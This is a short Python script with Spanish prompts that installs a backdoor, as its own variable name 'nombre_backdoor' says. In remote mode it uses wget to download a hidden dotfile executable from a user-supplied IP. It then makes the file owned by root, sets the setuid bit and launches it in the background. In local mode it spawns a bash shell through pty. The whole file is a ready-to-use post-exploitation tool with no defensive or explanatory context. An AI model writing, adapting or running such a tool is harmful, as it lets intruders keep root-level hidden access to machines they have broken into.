import os
import pty
import argparse

shell = ""
ip_remota = ""
nombre_backdoor = ""
extension = ""

parser = argparse.ArgumentParser()
parser.add_argument("-r ", "--remote", help="IP servidor web")
parser.add_argument("-e", "--executable", help="Nombre del ejecutable")
parser.add_argument("-x", "--extension", help="Extension del ejecutable")
args = parser.parse_args()

if args.remote is None or args.executable is None:
    args.remote = ""
    args.executable = ""

if len(args.remote) != 0 and len(args.executable) != 0 and len(args.extension) :
    ip_remota = args.remote
    nombre_backdoor = args.executable
    extension = args.extension
else:
    shell = input("Shell Local / Remota [l/R] :  \n")

if len(shell) == 0 or shell[0].upper() == "R":
    if len(nombre_backdoor) == 0 and len(ip_remota) == 0 :
        ip_remota = input("Introduce la IP a la que se conectara para descargar el ejecutable :  \n")
        nombre_backdoor = input("Introduce nombre del ejecutable (INCLUYE EL PUNTO SI ES OCULTO) :  \n")

    os.system("wget http://" + ip_remota + "/." + nombre_backdoor+"." + extension )
    os.system("chown root:root ." + nombre_backdoor +"."+extension)
    os.system("chmod +x ." + nombre_backdoor+"."+extension)
    os.system("chmod u+s ." + nombre_backdoor+"."+extension)
    os.system("./." + nombre_backdoor + "."+extension+" &")

else:
    pty.spawn("/bin/bash")
